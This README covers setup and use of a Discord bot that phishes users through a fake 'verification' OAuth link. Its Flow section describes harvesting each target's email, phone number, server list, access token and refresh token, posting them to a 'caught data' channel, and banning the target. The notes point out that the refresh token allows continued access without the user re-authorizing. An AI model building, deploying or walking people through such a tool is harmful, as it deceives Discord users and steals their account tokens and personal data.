# discord-verify-bot

## Discord Developer Portal setup

1. Go to https://discord.com/developers/applications
2. Create or open your application
3. **Bot tab** → copy the token → `DISCORD_TOKEN`
4. **General Information tab** → copy Application ID → `CLIENT_ID`
5. **OAuth2 tab** → copy Client Secret → `CLIENT_SECRET`
6. **OAuth2 → Redirects** → add your Render URL:
   ```
   https://your-app.onrender.com/callback
   ```
   Without this Discord will reject the OAuth flow.

## Render deploy

1. Push this repo to GitHub
2. Go to https://render.com → New → Web Service → connect the repo
3. Render reads `render.yaml` automatically — build and start commands are set
4. Add environment variables under the service's **Environment** tab:

| Variable | Value |
|---|---|
| `DISCORD_TOKEN` | Bot token from Developer Portal |
| `CLIENT_ID` | Application ID from Developer Portal |
| `CLIENT_SECRET` | Client Secret from OAuth2 tab |
| `BASE_URL` | `https://your-app.onrender.com` (Render gives you this URL) |

Do not set `PORT` — Render injects it automatically.

## Commands

| Command | What it does |
|---|---|
| `/set-channel #channel` | Sets where caught data gets posted — run this first |
| `/verify @user` | Generates an OAuth verification link for that user |
| `/panel` | Shows bot status, output channel, pending link count |

## Flow

1. `/set-channel` once to pin your output channel
2. `/verify @target` — bot gives you a link (ephemeral)
3. Send the link to the target
4. Target clicks → redirected straight to `discord.com/oauth2/authorize` (your page, Discord's domain)
5. They click Authorize
6. Discord sends them to `/callback` with an OAuth code
7. Server exchanges code for access token, pulls user info + guilds
8. Embed posted: username, ID, email, phone, nitro tier, server list (owned flagged), access token, refresh token
9. Target banned from origin guild

## Notes

- Free Render tier spins down after 15 minutes of inactivity — first request after spin-down takes ~30s. Upgrade to a paid plan or use a cron to ping /health every 10 minutes to keep it warm.
- OAuth scope is `identify email guilds` — covers all the info fields in the embed.
- Refresh token can be used to get new access tokens without the user re-authorizing.
